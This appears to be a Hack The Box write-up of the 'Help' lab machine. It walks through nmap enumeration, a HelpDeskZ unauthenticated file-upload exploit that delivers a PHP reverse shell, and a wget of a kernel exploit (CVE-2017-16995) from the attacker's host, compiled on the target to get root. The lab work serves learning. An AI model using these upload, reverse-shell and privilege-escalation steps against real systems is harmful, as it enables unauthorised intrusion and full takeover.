# HELP
## Writeup

### Script Kiddie
I'm currently just at [script kiddie](https://www.hackthebox.eu/home/users/profile/48556) level on Hack the Box and am doing these write-ups to try and improve.  There will most definitely be better ways of doing the boxes than I outline here in my write-ups so I welcome any comments and tips.

### Enumeration
```
root@kali:~/htb/help# nmap -sC -sV -oA nmap/initial 10.10.10.121
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-22 15:56 UTC
Nmap scan report for 10.10.10.121
Host is up (0.056s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Kicking off with the nmap scan we see 3 services open.  SSH, http and nodejs.  The sV part of the scan also shows us version numbers that we can check for vulnerabilities.  I don't really know anything about nodejs so will leave that one till last and check the reported version of OpenSSH for any vulnerabilities.

### SSH

```
root@kali:~# searchsploit OpenSSH 7.2p2
-------------------------------------------------- ----------------------------------------
 Exploit Title                                    |  Path
                                                  | (/usr/share/exploitdb/)
-------------------------------------------------- ----------------------------------------
OpenSSH 7.2p2 - Username Enumeration              | exploits/linux/remote/40136.py
OpenSSHd 7.2p2 - Username Enumeration             | exploits/linux/remote/40113.txt
-------------------------------------------------- ----------------------------------------
```
The weakness is that for some configurations, this version of ssh will respond with 'permission denied' error faster for an invalid user than it will for a legitimate user.  So you can try this attack with a user list and potentially enumerate some valid users for the machine.
I tried the python version of this exploit from exploit-db.com a number of times without success but then found it was in metasploit and included a 'CHECK_FALSE' option which checks for false positives by sending a few completely random usernames.  This test proved that the exploit wasn't working, time to move on.
        <SCREENSHOT>

### HelpDeskZ

Opening the box in a browser shows a default install of apache 2 for Ubuntu, nothing noticeable and there's no /robots.txt so I ran dirbuster with the small directory list.
<SCREENSHOT>
This quickly listed the /support directory which revealed the HelpDeskZ app, being the namesake of the box it looks like I'm on the right track.
<SCREENSHOT>
I played around with it for a little while to see if there was a way of injecting SQL or commands into any of the input fields but I couldn't find any.
So I checked searchsploit again.  There were two results, one with 'authorized' in the title which wouldn't help us right now and another one called 'Arbitrary File Upload'.
It turns out that this help desk system allows you to upload PHP files using the support ticket page.  It does tell you that this file type is not allowed when you upload it but does still save the file.  The software also renames the file to an md5 hash of the filename and current time as you can see in the source code below.  This means that you can still access and so run the php file if you can find out the new filename and where it is located.

I skim read the python script which states you just upload a php shell and run the script with the *base url* of the HelpDeskZ install and the name of your php shell.
I used this php reverse shell from pentestmonkey: (http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
```
root@kali:~/htb/help# python exploit.py http://10.10.10.121/support/ rshell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
Sorry, I did not find anything
```
This didn't work so I read the script again and thought about why the current time part was so important.  If this was a key part of the exploit, what *is* the current time?
I reloaded the page in firefox and checked the response headers and saw that the time was behind mine but not by a round number of hours suggesting it wasn't just in a different time zone.
I went down a little rabbit hole and made a [python script](http://link-to-script) to sync my local system time with that of the webserver.*virtualbox-service keep reseting time*

```
root@kali:~/htb/help# python timesync.py
Original system date:
Wed 22 May 18:37:33 UTC 2019
HELP Datetime: 2019-05-22 18:28:01
new system date:
Wed 22 May 18:28:01 UTC 2019
```

After this the exploit still failed.

So I read the exploit script *again*.  In the description it has a link to the source code file that contains the vulnerability so I checked that out on [github](link to source code) and here I found out the path that files are uploaded to; this needs to included in the first parameter of the exploit.

https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php
`HelpDeskZ-1.0/controllers/submit_ticket_controller.php`
```
137   if(!isset($error_msg) && $settings['ticket_attachment']==1){
138     $uploaddir = UPLOAD_DIR.'tickets/';
139     if($_FILES['attachment']['error'] == 0){
140     $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
141     $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
142     $fileuploaded[] = array('name' => $_FILES['attachment']['name'],
143     'enc' => $filename,
144     'size' => formatBytes($_FILES['attachment']['size']),
145     'filetype' => $_FILES['attachment']['type']);
146     $uploadedfile = $uploaddir.$filename;
        ...
```

https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/global.php
`HelpDeskZ-1.0/includes/global.php`
```
18   define('UPLOAD_DIR', ROOTPATH . 'uploads/');
```

So with my machines time in sync with the webserver and the right path set I was ready to try again.
```
root@kali:~/htb/help# python exploit.py http://10.10.10.121/support/uploads/tickets/ rshell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
found!
http://10.10.10.121/support/uploads/tickets/fc7240781f3464afcebb47bd8da49b9a.php
```

Now we've got a reverse shell through netcat from which we can go straight for the user flag
<SCREENSHOT> nc shell
<SCREENSHOT> nc commands

### Escalate

Now we need to find a way to escalate our privileges in order to get the root flag, and ideally to the root account itself.

As you can see from the screenshot above when the shell started, it shows the kernel version of `4.4.0-116-generic`.  I figured this sounded old enough to run it through searchsploit.
```
root@kali:~/htb/help# searchsploit 4.4.0-116
---------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                |  Path
                                                                                              | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------- ----------------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                        | exploits/linux/local/44298.c
---------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
That'll do.

[CVE-2017-16995](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16995)
#### Description
>The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.

I searched github for the CVE ID and found this code from [iBearcat](https://github.com/iBearcat/CVE-2017-16995/blob/master/exploit.c)
He includes instructions in his readme but its just a case of compiling the code on the target and running the resulting binary.

I started a simple http server on my machine to serve up the exploit and got it from the target machine from the reverse shell that was already running.

```
help@help:/$ cd /tmp
cd /tmp
help@help:/tmp$ wget http://10.10.14.9:6666/exploit.c
wget http://10.10.14.9:6666/exploit.c
--2019-05-22 13:59:50--  http://10.10.14.9:6666/exploit.c
Connecting to 10.10.14.9:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5775 (5.6K) [text/plain]
Saving to: 'exploit.c'

exploit.c           100%[===================>]   5.64K  --.-KB/s    in 0.01s

2019-05-22 13:59:50 (509 KB/s) - 'exploit.c' saved [5775/5775]

help@help:/tmp$ gcc exploit.c -o makemeroot
gcc exploit.c -o makemeroot
help@help:/tmp$ chmod +x makemeroot
chmod +x makemeroot
help@help:/tmp$ ./makemeroot
./makemeroot
task_struct = ffff880010cbaa00
uidptr = ffff880036aef2c4
spawning root shell
root@help:/tmp# whoami
whoami
root
root@help:/tmp#
```

### root.txt

All that is left to do is get the root flag.

```
root@help:/tmp# cd /root
cd /root
root@help:/root# ls
ls
root.txt
root@help:/root# cat root.txt
cat root.txt
b7fe608***************0d9daddb98
```

Thanks for reading and thanks to [cymtrick](https://www.hackthebox.eu/home/users/profile/3079) for creating the box.
